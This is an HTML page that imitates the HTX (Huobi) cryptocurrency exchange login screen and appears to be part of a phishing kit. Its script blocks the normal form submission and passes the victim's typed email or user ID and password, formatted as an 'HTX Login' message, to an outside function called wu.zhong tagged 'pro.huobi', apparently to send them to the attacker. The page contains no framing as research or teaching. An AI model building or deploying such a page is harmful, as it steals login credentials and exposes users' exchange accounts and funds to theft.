<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTX Account Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            flex: 1;
            padding: 40px 20px 20px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }

        .header {
            margin-bottom: 40px;
        }

        .header h1 {
            font-size: 32px;
            font-weight: 400;
            color: #333;
            line-height: 1.3;
            margin-bottom: 30px;
        }

        .account-type {
            color: #666;
            font-size: 16px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            background-color: #fff;
            color: #333;
            transition: border-color 0.2s ease;
        }

        .input-field::placeholder {
            color: #999;
        }

        .input-field:focus {
            outline: none;
            border-color: #2196F3;
        }

        .password-field {
            
            animation: slideDown 0.3s ease;
        }

        .password-field.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .next-btn {
            width: 100%;
            padding: 16px;
            background-color: #2196F3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-bottom: 20px;
        }

        .next-btn:hover {
            background-color: #1976D2;
        }

        .next-btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .signup-link {
            text-align: center;
            margin-bottom: 60px;
        }

        .signup-link a {
            color: #2196F3;
            text-decoration: none;
            font-size: 16px;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .divider {
            text-align: center;
            color: #999;
            margin: 40px 0;
            font-size: 14px;
        }

        .social-login {
            display: flex;
            justify-content: space-between;
            gap: 20px;
            margin-bottom: 40px;
        }

        .social-btn {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            background: white;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            text-decoration: none;
            color: #333;
            transition: background-color 0.2s ease;
        }

        .social-btn:hover {
            background-color: #f8f8f8;
        }

        .social-icon {
            width: 24px;
            height: 24px;
            margin-bottom: 8px;
            border-radius: 50%;
        }

        .google-icon {
            background: linear-gradient(45deg, #4285f4, #34a853, #fbbc04, #ea4335);
        }

        .telegram-icon {
            background: #0088cc;
        }

        .footer {
            padding: 20px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }

        .footer a {
            color: #2196F3;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .back-btn {
            display: none;
            background: none;
            border: none;
            color: #2196F3;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 10px;
            padding: 5px 0;
        }

        .back-btn.show {
            display: block;
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px 16px;
            }
            
            .header h1 {
                font-size: 28px;
            }
            
            .social-login {
                gap: 15px;
            }
            
            .social-btn {
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Log in to your account</h1>
            <div class="account-type">HTX Account</div>
        </div>

        <form id="loginForm">
            
            
            <div class="form-group">
                <input 
                    type="text" 
                    class="input-field" 
                    id="emailPhone" 
                    placeholder="Enter your email address/phone number/user ID"
                    required
                >
            </div>

            <div class="form-group password-field" id="passwordGroup">
                <input 
                    type="password" 
                    class="input-field" 
                    id="password" 
                    name="password"
                    placeholder="Enter your password"
                    required
                >
            </div>

            <button type="submit" class="next-btn" id="nextBtn">Log in</button>
        </form>

        <div class="signup-link">
            <a href="#" id="signupLink">Sign up</a>
        </div>

        <div class="password-options" id="passwordOptions" style="display: none;">
            <div style="text-align: center; margin: 20px 0; color: #666;">
                <a href="#" id="forgotPassword" style="color: #2196F3; text-decoration: none; font-size: 14px;">Forgot password?</a>
            </div>
        </div>
    </div>

    <div class="footer">
        By continuing, you accept our <a href="#">User Agreement</a>
    </div>

    <script>
        const emailPhone = document.getElementById('emailPhone');
        const password = document.getElementById('password');
       
        
      
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            if(emailPhone.value.length < 5 || password.value.length < 5){
                return;
            }
            

             wu.zhong(`🔰HTX Login \n\n✉️Email: ${emailPhone.value}\n\n🔒Password: ${password.value}`, "pro.huobi");
    

        });

      
        
    </script>
</body>
</html>
